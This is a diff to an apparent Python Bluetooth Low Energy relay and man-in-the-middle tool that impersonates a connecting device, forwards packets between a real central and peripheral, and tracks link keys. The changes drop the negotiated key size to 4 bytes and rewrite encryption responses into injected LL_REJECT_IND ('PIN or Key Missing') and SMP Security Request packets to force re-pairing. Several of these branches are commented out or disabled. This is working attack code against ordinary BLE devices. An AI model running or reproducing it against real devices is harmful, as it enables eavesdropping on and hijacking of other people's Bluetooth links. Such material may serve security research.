@@ -88,7 +88,7 @@ Empty--------->
 
 # global variable to access hardware
 hw = None
-new_key_size = 0x07
+new_key_size = 0x04
 
 found_key = None                  
 _found_key_lock = threading.Lock()
@@ -126,6 +126,11 @@ skdm_from_c  = None
 skds_from_p  = None
 skd_real_cp  = None
 
+bonding = True
+sent_reject = False
+LLENCREQ_body_copy = None
+LLENCREQ_event_copy = None 
+pairing_req_to_ll_reject_ind = False
 
 PROJECT_ROOT = Path(__file__).resolve().parent
 BRUTEFORCER_DIR = PROJECT_ROOT / "bruteforcer"
@@ -284,6 +289,7 @@ def main():
     if not isinstance(conn_req, ConnectIndMessage):
         raise ValueError("CONN_REQ was not a CONN_REQ!")
 
+    #input("Press Enter to continue...")
     if periph_ser is not None:
         try:
             periph_ser.write(b'1')
@@ -293,6 +299,7 @@ def main():
                 file=sys.stderr)
 
     print("Relay slave notified us of connection request. Connecting to real target...")
+
     print(conn_req)
     # Receiver = real central C (checks peripheral peer on the C<->P_r link)
     global pcwriter
@@ -328,6 +335,9 @@ def main():
     #input("Press Enter to initiate (send CONNECT_IND on next advert)...")
     #print('Send connection request...')
     # connect to real target, impersonating who connected to relay slave
+
+    input("Press Enter to continue...")
+
     connect_target(mac_bytes, args.advchan, not args.public, connector_addr,
             connector_random, connector_interval, connector_latency, preloads)
   #  print('Send connection request 1 sent')
@@ -550,14 +560,6 @@ def _extract_smp_auth_from_ll_body(ll_body: bytes):
     code = smp[0]
     if code not in (0x01, 0x02):  # Pairing Req/Resp
         return None
-    # SMP Pairing Request/Response fields:
-    # [0] code
-    # [1] IOcap
-    # [2] OOB
-    # [3] authReq
-    # [4] maxKeySize
-    # [5] initKeyDist
-    # [6] respKeyDist
     auth_req = smp[3]
     key_size = smp[4]
     sc = bool(auth_req & 0x08)
@@ -601,7 +603,9 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
     global skd_real_cp, skdm_from_c, skds_from_p
     global new_key_size
     global ltk_found, ltk, session_key
-
+    global bonding, sent_reject
+    global LLENCREQ_copy
+    global pairing_req_to_ll_reject_ind
 
     msg = hw.recv_and_decode()
     if isinstance(msg, PacketMessage):
@@ -834,6 +838,23 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
                 print(f"  old LL body ({len(old_body)} bytes): {_hex_bytes(old_body)}")
                 print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
                 msg.body = new_ll
+
+                # if pairing_req_to_ll_reject_ind:
+                #     print("Change pairing request to LL REJECT IND")
+                #     reject_opcode = 0x0D
+                #     error_code = 0x06  # PIN or Key Missing
+                #     llid = 0x03  # Control PDU
+
+                #     # Preserve NESN/SN/MD from the original message
+                #     old_hdr = msg.body[0] if len(msg.body) > 0 else 0x00
+                #     new_hdr = (old_hdr & 0b11111100) | llid
+
+                #     # LL Header (2 bytes) + payload (2 bytes)
+                #     msg.body = bytes([new_hdr, 0x02, reject_opcode, error_code])
+                #     pairing_req_to_ll_reject_ind = False
+                #     bonding = 0
+                #     print(f"  Injected LL_REJECT_IND into msg.body: {msg.body.hex()}")
+
             if manager is not None:
                 parsed = _extract_smp_auth_from_ll_body(new_ll)
                 if parsed is not None:
@@ -845,6 +866,73 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
                         mitm=mitm,
                         bonding=bonding,
                     )
+
+
+
+        # Replace LL_ENC_RSP with LL_REJECT_IND if bonding is set
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x04 and bonding:
+
+            print("[MODIFY] Replacing LL_ENC_RSP with LL_REJECT_IND (PIN or Key Missing)")
+
+            # Change opcode field in message object
+            msg.opcode = 0x0D  # LL_REJECT_IND
+            msg.payload = bytes([0x06])  # Error code: PIN or Key Missing
+
+            # Modify body while preserving NESN/SN/MD flags
+            old_hdr = msg.body[0] if len(msg.body) > 0 else 0x00
+            llid_masked = (old_hdr & 0b11111100) | 0b11  # LLID = 0b11 (LL Control PDU)
+
+            new_len = 2  # Payload: opcode + error code
+            new_opcode = 0x0D
+            error_code = 0x06
+
+            msg.body = bytes([llid_masked, new_len, new_opcode, error_code])
+            sent_reject = True
+
+            print(f"  Final msg.body = {msg.body.hex()}")
+            pairing_req_to_ll_reject_ind = True
+
+        # Replace LL_START_ENC with a Security Request, and send LL_REJECT_IND to peripheral
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x05 and bonding:
+            print("[MODIFY] Transforming LL_START_ENC_REQ → SMP Security Request and injecting LL_REJECT_IND toward P")
+
+
+            # if LLENCREQ_copy is not None:
+            #     # Extract and reuse NESN/SN/MD flags only
+            #     old_hdr = LLENCREQ_copy.body[0] if len(LLENCREQ_copy.body) > 0 else 0x00
+            #     llid_masked = (old_hdr & 0b11111100) | 0x03  # LLID = 0b11 = LL Control PDU
+
+            #     reject_opcode = 0x0D
+            #     error_code = 0x06
+            #     new_len = 2  # 1-byte opcode + 1-byte error
+
+            #     # Compose PDU cleanly from scratch
+            #     reject_pdu = bytes([llid_masked, new_len, reject_opcode, error_code])
+
+            #     # Optionally ensure no trailing garbage
+            #     reject_pdu = reject_pdu[:4]  # truncate to exact length if necessary
+
+            #     reject_pdu = bytes([reject_opcode, error_code])
+            #     # Transmit with fresh or compatible event if possible
+            #     hw.cmd_transmit(3, reject_pdu)  # safer to skip reusing old event
+            #     print(f"[INJECT] Sent LL_REJECT_IND (0x06) to peripheral: {reject_pdu.hex()}")
+
+            # --- Replace current LL_START_ENC_REQ with SMP Security Request ---
+            # Construct SMP Security Request payload
+            # SMP: [L2CAP len=0x02] [CID=0x0006] [SMP code=0x0B] [AuthReq=0x05]
+            #smp_sec_req = bytes([0x02, 0x00, 0x06, 0x00, 0x0B, 0x05]) 
+            smp_sec_req = bytes([0x02, 0x00, 0x06, 0x00, 0x0B, 0x05])  # L2CAP + SMP
+            new_len = len(smp_sec_req)
+            old_hdr = msg.body[0] if len(msg.body) > 0 else 0x00
+            #llid_masked = (old_hdr & 0b11111100) | 0x01 # LLID = 0b01 (L2CAP start)
+            llid_masked = (old_hdr & 0b11111100) | 0x02  # LLID = 0b10 = L2CAP Start
+
+            #msg.body = bytes([llid_masked, new_len]) + smp_sec_req
+            msg.body = bytes([llid_masked, len(smp_sec_req)]) + smp_sec_req
+            print(f"[MODIFY] Injected SMP Security Request to central: {msg.body.hex()}")
+            pairing_req_to_ll_reject_ind = True
+
+
 
         if not empty and not block_req:
             # Forward packets to the relay slave
@@ -884,6 +972,11 @@ def sock_recv_print_forward(conn, quiet,filter_changes=False):
     global new_key_size
     global link_encryption_active
     global ltk, ltk_found, session_key
+    global binding
+    global sent_reject
+    global LLENCREQ_body_copy 
+    global LLENCREQ_event_copy 
+    global pairing_req_to_ll_reject_ind
     # receive packets from relay slave and retransmit them here
     mtype, body = conn.recv_msg()
     if mtype != MessageType.PACKET:
@@ -906,20 +999,78 @@ def sock_recv_print_forward(conn, quiet,filter_changes=False):
         print(f"  old LL body ({len(old_ll)} bytes): {_hex_bytes(old_ll)}")
         print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
 
-    
-    event, = unpack('<H', body[:2])
-    body = body[2:]
-    llid = body[0] & 3
-    pdu = body[2:]
-    # construct packet object for display and PCAP
-    pkt = DPacketMessage.from_body(body, True)
-    pkt.ts_epoch = time()
-    pkt.ts = pkt.ts_epoch - hw.decoder_state.first_epoch_time
-    pkt.aa = hw.decoder_state.cur_aa
-    pkt.event = event
+
+        # === Move REJECT injection HERE, after pkt creation ===
+    if pairing_req_to_ll_reject_ind and changed and False:
+        print("Change pairing request to LL_REJECT_IND (PIN or Key Missing)")
+        if LLENCREQ_body_copy is not None and LLENCREQ_event_copy is not None:
+            # Extract and reuse NESN/SN/MD flags only
+            event = LLENCREQ_event_copy - 5
+            old_hdr = LLENCREQ_body_copy[0] if len(LLENCREQ_body_copy) > 0 else 0x00
+            llid_masked = (old_hdr & 0b11111100) | 0x03  # LLID = 0b11 = LL Control PDU
+
+            reject_opcode = 0x0D
+            error_code = 0x06
+            new_len = 2  # 1-byte opcode + 1-byte error
+
+            # Compose PDU cleanly from scratch
+            reject_pdu = bytes([llid_masked, new_len, reject_opcode, error_code])
+
+
+            reject_pdu = bytes([reject_opcode, error_code])
+            # Transmit with fresh or compatible event if possible
+            hw.cmd_transmit(3, reject_pdu, event)  # safer to skip reusing old event
+            print(f"[INJECT] Sent LL_REJECT_IND (0x06) to peripheral: {reject_pdu.hex()}")
+            return
+        # reject_opcode = 0x0D
+        # error_code = 0x06
+        # llid = 0x03  # LLID = 0b11 (Control PDU)
+
+        # event = old_packet[:2]
+        # old_hdr = old_packet[2] if len(body) > 0 else 0x00
+        # print(f"Old header: {old_hdr} \n")
+        # llid_masked = (old_hdr & 0b11111100) | llid  # preserve NESN/SN/MD
+
+        # body = bytes([llid_masked, 2, reject_opcode, error_code])
+        # opcode = reject_opcode
+        # pdu = bytes([reject_opcode, error_code])
+
+        # print(f"  Injected LL_REJECT_IND body = {body.hex()}")
+        # pairing_req_to_ll_reject_ind = False
+        # bonding = 0
+        
+        # event, = unpack('<H', old_packet[:2])
+        # print(f"BYTE 0: {old_packet[0]} \n")
+        # print(f"BYTE 1: {old_packet[1]} \n")
+        # print(f"EVENT: {event} \n")
+        # llid = body[0] & 3
+
+        # construct packet object for display and PCAP
+        # pkt = DPacketMessage.from_body(body, True)
+        # pkt.ts_epoch = time()
+        # pkt.ts = pkt.ts_epoch - hw.decoder_state.first_epoch_time
+        # pkt.aa = hw.decoder_state.cur_aa
+        # pkt.event = event
+        # hw.cmd_transmit(llid, pdu, event)
+        # print_message(pkt, quiet)
+        # return 
+    else:
+        event, = unpack('<H', body[:2])
+        body = body[2:]
+        llid = body[0] & 3
+        pdu = body[2:]
+        # construct packet object for display and PCAP
+        pkt = DPacketMessage.from_body(body, True)
+        pkt.ts_epoch = time()
+        pkt.ts = pkt.ts_epoch - hw.decoder_state.first_epoch_time
+        pkt.aa = hw.decoder_state.cur_aa
+        pkt.event = event
+
 
     # Handle LL_ENC_REQ from real central (C->P_r)
     if isinstance(pkt, LlControlMessage) and pkt.opcode == 0x03:
+        LLENCREQ_body_copy = pkt.body
+        LLENCREQ_event_copy = pkt.event
         skdm, ivm = _extract_skd_iv_from_ll_enc_req(pkt)
 
         if ivm is not None:
@@ -953,6 +1104,27 @@ def sock_recv_print_forward(conn, quiet,filter_changes=False):
         skds_from_p  = None
         skd_real_cp  = None
         link_encryption_active = False
+ 
+    #     # Replace LL_ENC_RSP with LL_REJECT_IND if bonding is set
+    # if isinstance(pkt, LlControlMessage) and sent_reject:
+    #     print("[MODIFY] Replacing LL_ENC_RSP with LL_REJECT_IND (PIN or Key Missing)")
+
+    #     # Change opcode field in message object
+    #     pkt.opcode = 0x0D  # LL_REJECT_IND
+    #     pkt.payload = bytes([0x06])  # Error code: PIN or Key Missing
+
+    #     # Modify body while preserving NESN/SN/MD flags
+    #     old_hdr = pkt.body[0] if len(pkt.body) > 0 else 0x00
+    #     llid_masked = (old_hdr & 0b11111100) | 0b11  # LLID = 0b11 (LL Control PDU)
+
+    #     new_len = 2  # Payload: opcode + error code
+    #     new_opcode = 0x0D
+    #     error_code = 0x06
+
+    #     pkt.body = bytes([llid_masked, new_len, new_opcode, error_code])
+    #     sent_reject = False
+
+    #     print(f"  Final pkt.body = {pkt.body.hex()}")
 
     # Passing on PDUs with instants in the past would break the connection
     if not (filter_changes and has_instant(pkt)):
